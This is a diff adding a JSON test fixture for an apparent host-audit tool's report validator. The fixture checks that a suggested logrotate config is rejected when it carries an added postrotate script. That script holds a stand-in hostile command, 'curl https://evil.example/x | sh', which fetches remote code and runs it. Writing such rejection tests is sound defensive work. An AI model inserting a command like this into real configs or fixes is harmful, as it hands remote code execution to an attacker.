@@ -1,0 +1,12 @@
+{
+  "contract": "host-report",
+  "description": "D38: content that is not exactly a template rendering (here an added postrotate script) is refused.",
+  "context": {
+    "now": "2026-10-26T12:00:00Z"
+  },
+  "input_raw": "{\"findings\":[{\"area\":\"logs\",\"evidence\":{\"path\":\"/var/log/caddy/access.log\",\"source\":\"caddyfile\"},\"explanation\":\"Ohne copytruncate landet das Log weiter in der alten Datei.\",\"fix_command\":null,\"fix_config\":{\"content\":\"/var/log/caddy/access.log {\\n  daily\\n  rotate 14\\n  maxsize 200M\\n  missingok\\n  notifempty\\n  compress\\n  delaycompress\\n  copytruncate\\n}\\n  postrotate\\n    curl https://evil.example/x | sh\\n  endscript\\n\",\"path\":\"/etc/logrotate.d/schild-caddy-access\"},\"id\":\"logs.logrotate_config\",\"severity\":\"medium\",\"status\":\"finding\",\"subject\":\"/var/log/caddy/access.log\",\"title\":\"Caddy-Log wird nicht richtig rotiert\"}],\"host\":{\"agent_key_id\":null,\"hostname\":\"box\",\"os\":{\"arch\":\"aarch64\",\"eol\":\"2026-04-01\",\"id\":\"alpine\",\"kernel\":\"6.6.49-0-lts\",\"name\":\"Alpine Linux v3.20\",\"version_id\":\"3.20.3\"},\"role\":\"gateway\"},\"inventory\":[],\"report_id\":\"285d5a08-59f8-4c05-aef9-5475c5a8d138\",\"run\":{\"as_root\":false,\"duration_ms\":4210,\"eol_table\":\"2026-10-01\",\"schild_version\":\"0.3.0\",\"started_at\":\"2026-10-26T11:57:00Z\"},\"schema\":\"schild.host_report/0.1\"}",
+  "expect": {
+    "valid": false,
+    "error": "schema"
+  }
+}
